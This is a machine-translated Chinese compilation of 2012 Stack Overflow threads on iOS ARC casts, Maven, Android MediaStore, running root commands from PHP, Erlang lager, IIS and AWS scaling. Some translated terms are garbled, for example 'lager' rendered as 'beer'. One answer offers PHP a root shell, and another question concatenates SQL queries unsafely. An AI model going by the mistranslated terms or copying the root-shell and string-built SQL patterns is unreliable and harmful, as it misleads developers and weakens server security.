> 标签：ios, automatic-ref-counting, type-conversion

我在 ARC 环境中遇到类型转换问题。如果有人也愿意解决它：

当我使用这行代码时：

```
NSData *resultData = nil;

NSMutableDictionary *passwordQuery = [query mutableCopy];

[passwordQuery setObject: (id) kCFBooleanTrue forKey: (__bridge  id) kSecReturnData];

status = SecItemCopyMatching((__bridge  CFDictionaryRef) passwordQuery, (CFTypeRef *) &resultData); 
```

然后我收到一个错误：

`Cast of an indirect pointer to an Objective C pointer to 'CFTypeRef*'(aka 'const void **')is disallowed with ARC.`

请建议我任何解决此问题的方法..

提前致谢..

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-11T18:45:38.440

结果数据类型只是`CFTypeRef`在调用`SecItemCopyMatching`so 之后的直到，通过传入 a 开始`CFTypeRef`：

```
CFTypeRef resultData = nil;
status = SecItemCopyMatching((__bridge CFDictionaryRef) passwordQuery,  &resultData); 
```

由于查询指定`resultData`应该是 a`CFDataRef`现在`resultData`是 a `CFDataRef`，因此您现在可以将其转换为这样。然后将其进一步转换为`NSData`.

```
CFDataRef resultCFData = (CFDataRef)resultData;
NSData *resultNSData = (__bridge NSData *)resultCFData; 
```

或者在一行中：

```
NSData *resultNSData = (__bridge NSData *)(CFDataRef)resultData; 
```

# php - 如何将卢比符号添加到magento

> ID：12328898
> 
> 赞同：-1
> 
> 时间：2012-09-08T07:25:55.713
> 
> 标签：php, magento, special-characters, currency, symbols

> **可能重复：**
> [如何更改卢比符号](https://stackoverflow.com/questions/7708967/how-to-change-rupee-symbol)

我想更改 magento 中的默认美元符号。如何将卢比符号添加到 magento 货币符号？有什么解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T07:31:46.397

# maven - “参数”在 release:prepare 中做了什么？

> ID：12328901
> 
> 赞同：2
> 
> 时间：2012-09-08T07:26:49.413
> 
> 标签：maven, maven-release-plugin

我想知道“参数”作为**release:prepare**参数究竟做了什么，我们应该为它设置什么值？我在[release:prepare description](http://maven.apache.org/plugins/maven-release-plugin/prepare-mojo.html#arguments)上检查了它的描述，但我不明白。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T08:57:45.810

发布插件可能会一路调用 Maven，并指定不同的阶段/目标/参数。该`-Darguments`选项对于将参数传递给那些嵌套执行很有用。

如果您键入`mvn release:prepare -Dmy.var=xxx`，那么`my.var`将只为发布插件定义，它不会将其传递给 Maven 的嵌套调用。

[在此处查看示例](http://mrhaki.blogspot.com/2008/07/passing-d-arguments-along-to-release.html)

# android - 如何用光标读取文件夹的内容

> ID：12328902
> 
> 赞同：1
> 
> 时间：2012-09-08T07:26:52.407
> 
> 标签：android, android-layout, android-intent

我在读取我在此路径的文件夹中复制的一些图像文件时遇到问题：/sdcard/DCIM/Wallpaper/。

问题在于随机读取这些图像：

我正在使用这种方法，但似乎光标没有读取我传递的 URI，发生了什么？

```
public static Uri getRandomImage(ContentResolver resolver) {

    String[] projection = new String[] {
        BaseColumns._ID
    };

    String folder = "/sdcard/DCIM/Wallpaper/";
    folder = folder + "%";
    String where = Media.DATA + " LIKE ?";
    String[] whereArgs = new String[]{folder};

    Cursor cursor = resolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
        projection, where, whereArgs, MediaColumns._ID);

    if (cursor == null || cursor.getCount() <= 0) {
            return null;
    }

    cursor.moveToPosition(new Random().nextInt(cursor.getCount()));

    return Uri.withAppendedPath(uri, cursor.getString(0));
} 
```

日志猫：

```
E/it.bisemanuDEV.slidepuzzle.TileView(4458): java.io.FileNotFoundException: No content provider: 
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.content.ContentResolver.openAssetFileDescriptor(ContentResolver.java:464)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.content.ContentResolver.openFileDescriptor(ContentResolver.java:380)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at it.bisemanuDEV.slidepuzzle.TileView.getImageFromUri(TileView.java:562)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at it.bisemanuDEV.slidepuzzle.TileView.onDraw(TileView.java:241)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.View.draw(View.java:6741)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewGroup.drawChild(ViewGroup.java:1640)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:1367)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewGroup.drawChild(ViewGroup.java:1638)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:1367)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.View.draw(View.java:6744)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewGroup.drawChild(ViewGroup.java:1640)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:1367)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.View.draw(View.java:6744)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.widget.FrameLayout.draw(FrameLayout.java:352)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewGroup.drawChild(ViewGroup.java:1640)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewGroup.dispatchDraw(ViewGroup.java:1367)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.View.draw(View.java:6744)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.widget.FrameLayout.draw(FrameLayout.java:352)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at com.android.internal.policy.impl.PhoneWindow$DecorView.draw(PhoneWindow.java:1842)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewRoot.draw(ViewRoot.java:1407)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewRoot.performTraversals(ViewRoot.java:1163)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.view.ViewRoot.handleMessage(ViewRoot.java:1727)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.os.Handler.dispatchMessage(Handler.java:99)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.os.Looper.loop(Looper.java:123)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at android.app.ActivityThread.main(ActivityThread.java:4627)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at java.lang.reflect.Method.invokeNative(Native Method)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at java.lang.reflect.Method.invoke(Method.java:521)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
E/it.bisemanuDEV.slidepuzzle.TileView(4458):    at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T09:40:02.360

您正在尝试获取目录的 Uri，该目录不会出现在 Media Uri 中。所以你得到了 FilenotfoundException。

您必须进行自定义查询才能仅获取目录中存在的图像

编辑：从未尝试过，但请尝试一下。where 子句应该使用 LIKE。如果这不起作用，您可能不得不环顾四周以构造 LIKE 子句。

```
String folder = "/sdcard/DCIM/Wallpaper/";
folder = folder + "%";
String where = Media.DATA + " LIKE ?";
String[] whereArgs = new String[]{folder};

cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
    projection, where, whereArgs, MediaColumns._ID); 
```

编辑2：

在`getContentResolver`你返回为空。`getContentResolver`是上下文的一种方法。利用`context.getContentResolver`

# php - 通过 php 以 root 身份运行命令

> ID：12328904
> 
> 赞同：1
> 
> 时间：2012-09-08T07:27:12.747
> 
> 标签：php, apache, sudo, su

我有一个包含 su 的 php 脚本。当我在 shell 中运行它时，它要求输入 root 密码并且运行良好。但现在我想为它制作一个界面。如您所知，php-apache 中的所有命令都以 www-data 用户身份运行，并且该用户没有指定密码或不在 sudoers 中。所以我不能使用“echo pass | sudo -S ...”，因为我不知道 www-data 的密码是什么，并且在每个服务器上为 www-data 设置密码或将其添加到 sudoers+nopass 中都不合逻辑， 是吗？

你能建议什么解决方案来解决这个问题？

我的命令之一：

```
su -c \"/usr/sbin/dmidecode -s baseboard-serial-number | tr \  \-\" 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T07:44:57.957

[phpseclib](http://phpseclib.sourceforge.net/)应该是最好的库选择，因为它不需要任何额外的扩展。

```
<?php
include('Net/SSH2.php');

$ssh = new Net_SSH2('example.com');
if (!$ssh->login('user', 'pass')) {
    exit('Login Failed');
}

echo $ssh->exec('whoami');
echo $ssh->exec('pwd');
?> 
```

另一种选择是[libssh2](http://pecl.php.net/ssh2)，但它必须单独编译，并且`difficult`以设置/使用而闻名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-26T10:03:00.827

我最近发布了一个项目，可以让 PHP 获得一个真正的 Bash shell 并与之交互，你可以很容易地用 root 获得一个 shell。在这里获取：[https ://github.com/merlinthemagic/MTS](https://github.com/merlinthemagic/MTS)

下载后，您只需使用以下代码：

```
$shell    = \MTS\Factories::getDevices()->getLocalHost()->getShell('bash', true);

$strCmd = "\"/usr/sbin/dmidecode -s baseboard-serial-number | tr \  \-\"";
$return1  = $shell->exeCmd($strCmd);

echo $return1;// return from your command 
```

# java - 是否可以从 jsp 返回到 servlet 调用者？

> ID：12328910
> 
> 赞同：0
> 
> 时间：2012-09-08T07:28:51.080
> 
> 标签：java, jsp, servlets

是否可以从 jsp 返回到调用者 servlet？

这就是我的程序的运行方式。

ServletA ---调用----> JSP（有形式）-----返回值-------->ServletA

它是一个循环。

我正在考虑将文件放在我的数据存储中，但它会花费太多查询，所以我正在寻找捷径。

提前感谢您的想法。:)

# java - 我应该为高效的方法选择高时间复杂度数据结构还是高空间复杂度数据结构？

> ID：12328911
> 
> 赞同：1
> 
> 时间：2012-09-08T07:28:56.740
> 
> 标签：java, performance, data-structures, time-complexity

我必须在 ArrayList 和 LinkedList 这两种数据结构之间进行选择。我有两个操作 op_one，op_two。

如果我选择 ArrayList - 我最终会得到

```
for op_one ------ O(n), and at maximum n re-allocations
for op_two ------ O(1), and at maximum n re-allocations 
```

如果我选择 LinkedList - 我最终会得到

```
for op_one ------ O(n), and zero re-allocations
for op_two ------ O(n), and zero re-allocations 
```

我将存储数百万个可比较的元素。我将同样可能地进行这两项操作。我应该选择哪一个。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T07:36:35.333

我建议您将它们一起计时，并以一种现实的方式，看看哪个更快。如果它们没有显着不同，我会使用您认为最简单的方法。

虽然 ArrayList 和 LinkedLIst 的空间顺序相同，但 ArrayList 小得多。

除非您知道自己有性能问题，否则所有相同的清晰度通常是最重要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:33:01.267

*(Question first understood as time complexity disregarding space. Request for clarifications made in comments)*

I would use ArrayList (over LinkedList), not only because time complexity, but because it is simpler and it doesn't build a new node for each item.

Note overall complexity will be O(n) in either case: For ArrayList an O(n) + O(1), or prob*O(n) + (1-prob)*O(1) will be in the order of O(n).

Given equal complexity ( O(n) ), then you should find out actual execution time, or chose the easier to implement or maintain.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T12:25:44.473

考虑到在现代架构中，内存带宽通常是瓶颈。因此，有时计算结果比存储和读取预先计算的值更快。换句话说，计算复杂度应该与内存复杂度一起考虑。如果计算成本不高并且可以在缓存中工作，我会保持较小的内存使用量。

但最后，你将不得不测试......

# php - 在每个 mysql 获取的结果中包含类似和不一样选项的脚本

> ID：12328915
> 
> 赞同：0
> 
> 时间：2012-09-08T07:29:29.643
> 
> 标签：php, mysql, pdo

```
while($info = mysql_fetch_array( $result )) 
{ 
    //Outputs the data
    Echo "<b>".$info['name'] . " </b> :-<br>"; 
    include('db.php');
    $postid = 1;
    $data = mysql_fetch_object(mysql_query('SELECT  `like` , `unlike` FROM posts WHERE id=" '.$postid.' "  '));
    Echo "<html><body><a href='javascript:;' onclick='doAction($postid,like);'>Like (<span id='<?php echo $postid;?>_likes'>$data->like</span>)</a></html></body>";
    Echo "<html><body><a href='javascript:;' onclick='doAction($postid,unlike);'>Unlike (<span id='<?php echo $postid;?>_unlikes'>$data->unlike</span>)</a></html></body>";
} 
```

在上面的脚本中，我在每个获取的结果中都包含了选项`like`。`unlike`

我得到以下结果：`like (0)unlike (0)`

每件事都完美无缺。唯一的问题是单击时它不会增加。

请帮我。

它在下面显示的简单代码中完美运行：

```
<html>
    <head>
        <script src="http://code.jquery.com/jquery-1.3.2.min.js"></script>
        <script>
            function doAction(postid,type){
                $.post('doAjax.php' , {postid:postid, type:type}, function(data){
                    $('#'+postid+'_'+type+'s').text(data);
                });
            }
        </script>
    </head>
    <body>
        <?php
            include('db.php');
            $postid = 1;

            $data = mysql_fetch_object( mysql_query( 'SELECT  `like` , `unlike` FROM posts WHERE id= " ' . $postid . ' " ' ) );
        ?>
        <p>hello</p>
        <a href="javascript:;" onclick="doAction('<?php echo $postid; ?>','like');">Like (<span id="<?php echo $postid; ?>_likes"><?php echo $data->like; ?></span>)</a>
        <a href="javascript:;" onclick="doAction('<?php echo $postid; ?>','unlike');">Unlike    (<span id="<?php echo $postid; ?>_unlikes"><?php echo $data->unlike; ?></span>)</a>
    </body>
</html> 
```

我也想使用`PDO`而不是`mysql_fetch`上面显示的脚本。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T08:14:04.000

尝试将 2 行“Echo <html...>”替换为：

```
echo "<div><a href='javascript:;' onclick='doAction($postid,like);'>Like (<span id='{$postid}_likes'>{$data->like}</span>)</a></div>";
echo "<div><a href='javascript:;' onclick='doAction($postid,unlike);'>Unlike (<span id='{$postid}_unlikes'>{$data->unlike}</span>)</a></div>"; 
```

其他问题：-避免使用 mysql_query，按照建议使用 PDO

- 循环内的查询会导致性能不佳。您应该有一个获取信息和喜欢的查询（使用 JOIN）。并在循环内显示每个信息的喜欢。

# erlang - 使用更大的日志框架时总是出现 lager_transform 的 undef 错误

> ID：12328921
> 
> 赞同：5
> 
> 时间：2012-09-08T07:30:58.317
> 
> 标签：erlang, rebar

我想使用 lager 作为我的日志实用程序，并且我将我的项目组织如下：

```
proj\
  |
  |--lager\
  |    |--src\
  |    |--ebin\
  |    |--...
  |     
  |--logserver\
  |    |--src\
  |    |--ebin\
  |    |--rebar.config
  |    |--...
  |
  |--rebar
  | 
```

但是，当我尝试编译 logserver 时，总是出现以下错误：

D:\proj\logserver>..\rebar 编译

```
==> logserver (compile)
src/logserver_app.erl:none: error in parse transform 'lager_transform': {undef,
                                             [{lager_transform,
                                               parse_transform,
                                               [[{attribute,1,file,
                                                  {"src/logserver_app.erl",1}},  
                                                  ... 
```

任何人都可以知道原因吗？谢谢！

这些是一些附加信息：

*   我正在使用 Windows 操作系统并使用最新版本的 Erlang 以及 rebar 和 lager。
*   lager 本身已经编译好了。我们可以找到 D:\proj\logserver>dir ..\lager\ebin\lager_transform.beam （这样会成功）
*   rebar 的配置文件（D:\proj\logserver\rebar.config）：

    ... {erl_opts, [{parse_transform, lager_transform}, debug_info,{d,'TEST'}, {i, "include"}, {src_dirs, ["src"]}]}。

    {lib_dirs, ["..\lager\ebin"]}。...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-07-05T08:38:23.930

如果您的部门中已经有较大的依赖项，请确保首先移动较大的依赖*项*，`rebar.config`以便它首先编译。像这样：

```
{deps,[
  lager,
  ..
]}. 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-10T10:32:34.707

您是否在 ? 中添加了*啤酒*作为依赖项`rebar.config`？我猜*啤酒*不在路上。

从[钢筋维基](https://github.com/basho/lager#usage)：

> 要在您的应用程序中使用 lager，您需要将其定义为 rebar dep 或以其他方式将其包含在 erlang 的路径中。然后，您可以将以下选项添加到 erlang 编译器标志：
> 
> ```
> {parse_transform, lager_transform} 
> ```

您可以通过编辑以下内容将“lager”添加为依赖项`rebar.config`：

```
%% == Dependencies ==

%% Where to put any downloaded dependencies. Default is "deps"
{deps_dir, "deps"}.

%% What dependencies we have, dependencies can be of 3 forms, an application
%% name as an atom, eg. mochiweb, a name and a version (from the .app file), or
%% an application name, a version and the SCM details on how to fetch it (SCM
%% type, location and revision). Rebar currently supports git, hg, bzr and svn.
{deps, [application_name,
        {application_name, "1.0.*"},
        {application_name, "1.0.*",
         {git, "git://github.com/basho/rebar.git", {branch, "master"}}}]}. 
```

在你的情况下，这应该是这样的：

```
{deps, [{lager, ".*", {git, "git://github.com/basho/lager.git", "HEAD"}}]}. 
```

有关钢筋依赖项管理器的更多信息，请点击此处：

[https://github.com/basho/rebar/wiki/Dependency-management](https://github.com/basho/rebar/wiki/Dependency-management)

# java - 构造函数和构造函数重载

> ID：12328924
> 
> 赞同：3
> 
> 时间：2012-09-08T07:31:21.670
> 
> 标签：java, oop, constructor, constructor-overloading

谁能解释一下？

当我们重载具有不同参数的构造函数时，一个具有数据类型对象，另一个具有数据类型字符串，并且当我们创建此类的对象并提供输入参数为 null 时，它使用字符串作为输入参数而不是输入参数为 Object 的构造函数。由于 Object 是 String 的超类，谁能告诉我为什么它用输入参数字符串调用构造函数？

```
Class A
{
  public A(Object o)
   {
     System.out.println("Object Drawn");
   }
   public A (String o)
   {
     System.out.println("String Drawn");
   }
   public static void main(String args[])
   {
   new A(null);
   }
 } 
```

输出：- 绘制字符串

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T07:34:01.310

It always calls the most specific matching method or constructor. If it didn't you would always call `Object` and overloading it would be pointless.

This approach is using in Java and C++

# php - Yii : 如何从另一个控制器调用权限模型

> ID：12328925
> 
> 赞同：0
> 
> 时间：2012-09-08T07:31:33.997
> 
> 标签：php, yii, yii-extensions

问：如何从权限扩展表（authitem）中检索用户扩展的用户/管理员控制器的数据。

状态：我正在使用权限和用户扩展。两个扩展都可以单独工作。

这是我的代码

```
$roles = AuthItem::model()->findAll('type=2'); 
```

这是我的 main.php

```
'import'=>array(

        'application.models.*',
        'application.components.*',

        // user extenstion

        'application.modules.user.models.*',
        'application.modules.user.components.*',

        // rights extensions
        'application.modules.rights.*', 
        'application.modules.rights.components.*', // Correct paths if necessary.
    ), 
```

这是错误消息

```
include(AuthItem.php) [<a href='function.include'>function.include</a>]: failed to open stream: No such file or directory 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T08:26:49.877

事实证明，你不能这样做，你不能访问使用 AuthItem 作为模型并从中检索信息..

我在上一个使用 Rights 的项目中遇到了这个问题，并且需要`all users of a particular role`, `needed a dropdown of all roles, from which admin can choose`,`all roles assigned to a user`等要求。

我写了一篇很好的博客文章，为这些问题提供了解决方案。

其中之一，这似乎是你的情况是：

**生成应用程序中所有可用角色的复选框。**

```
<?php
   $all_roles=new RAuthItemDataProvider('roles', array('type'=>2));
   $data=$all_roles->fetchData();
?>
<div>
    <label for="type_id">Type</label>
    <?php echo CHtml::checkBoxList("Type",'',CHtml::listData($data,'name','name'));?> 
</div> 
```

你可以在这里找到完整[的博客文章](http://octathorpeweb.com/blog/2012/03/06/yii-rights-extension-rbac-role-based-access-control/)

# java - 在 Android 中获取真实的屏幕尺寸

> ID：12328926
> 
> 赞同：1
> 
> 时间：2012-09-08T07:31:37.723
> 
> 标签：java, android, screen-resolution

我知道使用 获取“屏幕大小”的方法`DisplayMetrics`，但正如 SDK 文档中的注释：

> 此方法返回的尺寸不一定代表显示器的实际原始尺寸（原始分辨率）。可以调整返回的大小以排除某些始终可见的系统装饰元素。它还可以扩展以提供与最初为较小显示器设计的旧应用程序的兼容性。

反正有没有得到真正的屏幕尺寸？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:45:10.820

它可能不是您问题的答案，但如果您需要一个视图的维度，因为您的代码在其布局尚未布局时正在执行（例如在 onCreate() 中），您可以设置带有`ViewTreeObserver`View.getViewTreeObserver().addOnGlobalLayoutListener() 的 .OnGlobalLayoutListener 并将需要视图尺寸的相关代码放在那里。布局布局后，将调用侦听器的回调。

欲了解更多详情，请访问：[ViewTreeObserver](http://developer.android.com/reference/android/view/ViewTreeObserver.html)

但是对于一般的屏幕尺寸，我们使用`DisplayMetrics`自己，但忽略了 SDK 文档说明。

# asp.net - IIS 错误 - HTTP 错误 500.24 - 内部服务器错误

> ID：12328930
> 
> 赞同：4
> 
> 时间：2012-09-08T07:32:24.433
> 
> 标签：asp.net, iis

我最近在我的 Windows 7 PC 上安装了 IIS，当我打开`http://localhost/`它时显示

```
********************错误**********************  
HTTP 错误 500.24 - 内部服务器错误
已检测到不适用于集成托管管道模式的 ASP.NET 设置。  
********************错误**********************

********************详细错误信息**************  
模块：ConfigurationValidationModule  
通知：开始请求  
处理程序：静态文件  
错误代码：0x80070032  
请求的网址：http://localhost:80/  
物理路径：C:\inetpub\wwwroot  
登录方式：尚未确定  
登录用户：尚未确定  
************************

```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-08T07:45:07.170

我不确定您正在运行什么代码/配置，但您可能需要更改您网站的应用程序池以使用*经典*模式而不是*集成*模式。

*   这是对差异的一个很好的[解释](https://help.maximumasp.com/KB/a657/explanation-of-classic-vs-integrated-mode-in-iis-7x.aspx)。

> 经典模式是 IIS 仅直接与 ISAPI 扩展和 ISAPI 过滤器一起使用的地方......集成模式通过 IIS 的统一管道处理所有请求，并通过同一管道与 ASP.NET 紧密集成。

*   您可能会遇到麻烦的地方：

> 一些遗留代码可能需要您在经典模式下运行才能正确执行。为了充分利用 IIS，如果您的应用程序在 Integrated 中抛出错误但在 Classic 中运行良好，我们强烈建议您检查您的代码。

*   要调试集成模式[的洗衣问题列表。](https://help.maximumasp.com/KB/a666/troubleshooting-integrated-pipeline-issues.aspx?KBSearchID=1752)

# c# - 当另一个方法在 Windows 窗体中结束时调用一个方法

> ID：12328933
> 
> 赞同：0
> 
> 时间：2012-09-08T07:32:51.343
> 
> 标签：c#, .net, winforms

我正在制作一个 tictactoe 游戏，您可以在其中与另一个人或 AI 对战。两个 AI 也可以互相对战。当两个 AI 互相对战时，我得到一个 stackover flow，保护页面错误。

发生的事情是，当 AI 单击按钮时，我的“ClickHandler”方法将被调用。在这个方法结束时，我会调用一个方法（playATurn），让其他玩家选择一个按钮，然后再次调用“ClickHandler”，我会有一个无休止的递归。

我已经在方法结束时使用计时器解决了这个问题，该方法在 1 毫秒后调用“playATurn”，但这很慢。

我的问题是在我的程序完成“ClickHandler”之后，我可以编写一个事件或其他东西来调用“playATurn”。

谢谢！

```
private void ClickHandler(object sender, System.EventArgs e)
{
    Button tempButton = (Button)sender;

    if (tempButton.Text != "")  // if is it empty
    {
        MessageBox.Show("Button already has value!", "ERROR", MessageBoxButtons.OK);
        return;
    }

    if (_isX)   // put the character in the Text property
    {
        tempButton.Text = "X";
        turn.Text = "O";
    }
    else
    {
        tempButton.Text = "O";
        turn.Text = "X";
    }
    _isX = !_isX;   // prepare for next character

    this._isGameOver = CheckAndProcessWinner();
    if (_isGameOver) gamesRemaining.Text = (--PlayerMenu.counterForNumberOfGames).ToString();
    if (_isGameOver && PlayerMenu.counterForNumberOfGames == 0)
    {
        MessageBox.Show(playerOne.name + " Wins: " + playerOne.numberOfWins + " Loses: " + playerOne.numberOfLoses + " Ties: " + playerOne.numberOfTies);
    }
    else if (_isGameOver && PlayerMenu.counterForNumberOfGames > 0)
    {
        InitTicTacToe();
    }
    else if (!_isGameOver && PlayerMenu.counterForNumberOfGames > 0)
    {
        if (_isX)
            playerOne.pickMove(_buttonArray, playerTwo);
        else
            playerTwo.pickMove(_buttonArray, playerOne);
    }
    myTimer.Start();
}

private void playATurn(object sender, System.EventArgs e)
{
    if (!_isGameOver && PlayerMenu.counterForNumberOfGames > 0)
    {
        if (_isX)
            playerOne.pickMove(_buttonArray, playerTwo);
        else
            playerTwo.pickMove(_buttonArray, playerOne);
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T07:44:31.550

您不想运行*得*太紧，或者 Windows 消息循环想要运行并且它不会更新。也许考虑：

```
private void PerformMove() {
    // ... Your existing code
    if(runAgain) {
        this.BeginInvoke((MethodInvoker)delegate{
            PerformMove();
        });
    }
}
private void ClickHandler(object sender, System.EventArgs e) {
    PerformMove();
} 
```

然后通过每次迭代的消息循环进行，因此 UI 应该是响应式的……差不多。

# architecture - Redesign of Server architecture on Amazon AWS

> ID：12328937
> 
> 赞同：0
> 
> 时间：2012-09-08T07:33:14.747
> 
> 标签：architecture, nginx, amazon-ec2, amazon-web-services, memcached

Our current architecture of a project is as below. There are 2 amazon instances. Both has Ubuntu 10.10 installed on it.

**Instance 1: (m1.large) --** This instance has Php, Apache and MySql installed. It contains main website + API (Developed in Php) + Database (MySql)

**Instance 2: (t1.micro) --** This instance has Php, Apache and MySql installed. It contains a Javascript.

**Client-Server Interaction:** On client side, there is a block of JS code which loads JS file of **Instance 2** on client. This JS file creates request and sends it to API on **Instance 1**. API on instance 1 generates response and sends it to client.

On instance 1 there are cron processes which run on weekly basis, i.e. every Sunday for around 5-6 hrs.

Maximum CPU utilization on instance 1 is around 80% and on Sunday when cron is set to run, it goes above 95%. Average request count per day on main instance is around 225k.

```
**There is no issue on instance 2 of CPU utilization.Size of database is 7.5 GB** 
```

**Need of new Architecture:** As we can see, in the current architecture the CPU Utilization is high. If we want to serve more requests, this architecture is not efficient. As our number of clients are increasing, number of requests on server and database size will also increase.

Can you please suggest new architecture design? We are also planning to change our database from MySql to MongoDB. Also, separate Database from instance 1\. Is this a right decision?

Can anyone please suggest any new technology which we can implement for the new architecture like Memcached, nginx etc.

Thank you.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-11T19:00:04.463

这是一个指向可能有帮助的 Amazon[参考架构之一的链接：](http://media.amazonwebservices.com/architecturecenter/AWS_ac_ra_web_01.pdf)

![在此处输入图像描述](../Images/a8c4773b45f443fe27cbb1e0b7e80fc2.png)

简而言之：

*   将您的基础架构拆分为多个层（Web、应用程序、数据）
*   使用 Auto Scaling 组随着您的流量增加/减少而加速/减速
*   跨可用区拆分层以实现高可用性
*   使用 CloudFront 托管静态图像/javascript/等。对于速度敏感的物品

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T20:03:29.887

好吧，我同意@Mike Brant。这里每个人的意见都很好，底线是 - “是否使用 Mongo 与 MySQL 真的取决于你的数据结构（即它更适合关系结构还是无模式结构）。” 关于静态内容问题，我认为 Nginx 是一个不错的选择，但我不排除 Cloudfront（主要是因为缺乏足够的经验）。但至于您的数据库选择，如果您选择 NoSQL，我认为[mongoDB](http://www.mongodb.org/)是一个不错的选择，如果您选择 MySQL，我建议您除了 RDS 之外，还可以看看[Xeround 。](http://xeround.com/)干杯:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T09:39:14.573

这是一个非常普遍的问题，但这里有几点需要考虑：

*   让您的数据库脱离应用服务器。您可以将[Amazon RDS](http://aws.amazon.com/en/rds/)用于 Amazon 托管的 MySQL 实例。
*   尝试为静态资源使用单独的网络服务器。[nginx](http://nginx.org/)将是一个不错的选择。
*   nginx 也可以作为前端代理，将动态 PHP 请求转发到后端服务器。
*   此选项还为您提供了更轻松的可扩展性。如果您需要额外的计算能力，只需添加更多后端 PHP 服务器，将它们添加到您的 nginx 配置中即可。
*   在您的应用程序中，尝试使用连接到 memcache 的透明缓存层（可能应该安装在另一个实例上）。如果在缓存中找不到结果，则构建它（例如通过查询数据库）并将其存储在缓存中。以后的请求可以使用缓存中的结果。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-09T07:35:56.390

好吧，这里有几件事您可能需要考虑：

1.  您需要知道您收到的最大连续请求数，而不是一天的平均请求数。您可以通过在 apache.conf 中设置（到某个限制）并增加 ec2 实例的配置/使用 autoscaling 来改进和测试 apache 处理的连续请求的数量。由于周日的 cron 作业导致您的 cpu 利用率上升，因此在 cpuutilization 上自动缩放是可行的方法。

2.  您可以考虑使用 Cloudfront ，它可以提高性能（如检索时间），并使应用程序具有高可用性。

3.  如果您计划迁移到 MongoDb，您将无法使用 RDS。如果你坚持使用Mysql，你应该使用RDS。

4.  在考虑 memcache 时，尝试在应用程序级别和数据库级别实现缓存，因为 memcache 可能会给您一些差异。

5.  Nginx 是提供静态内容的不错选择，并且可以充当良好的代理服务器。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-14T16:40:02.143

这里其他人的想法真的很好。我想我会加入静态内容，因为其他答案中的共同主题是为此使用 Nginx 之类的东西。对我来说，我发现将图像、javascript、CSS 等放入 S3 存储桶并放入 Cloudfront 发行版要容易得多，而不必为这些内容提供 Web 服务器而烦恼。您可以在更靠近最终用户的边缘节点上获取静态内容，而根本不必担心任何缩放方面的问题。

我还建议迁移到更新版本的 Ubuntu（可能是 Canonical 的 12.04）。

我会尽量不在任何实际的生产网络服务器上运行大型 cron 进程（即那些消耗大量 CPU 或磁盘周期的进程）。可能会根据需要启动一个相同的实例，而不是在您的负载均衡器中）来执行这些任务。这也可以让您适当地调整 Web 服务器的大小/扩展（不适用于 cron 运行时的最坏情况）

是否使用 Mongo 与 MySQL 真的取决于您的数据结构（即它更适合关系结构还是无模式结构）。

# php - 网站需要每张照片的几种不同尺寸+提供此照片的最有效方法是什么

> ID：12328938
> 
> 赞同：2
> 
> 时间：2012-09-08T07:33:26.150
> 
> 标签：php

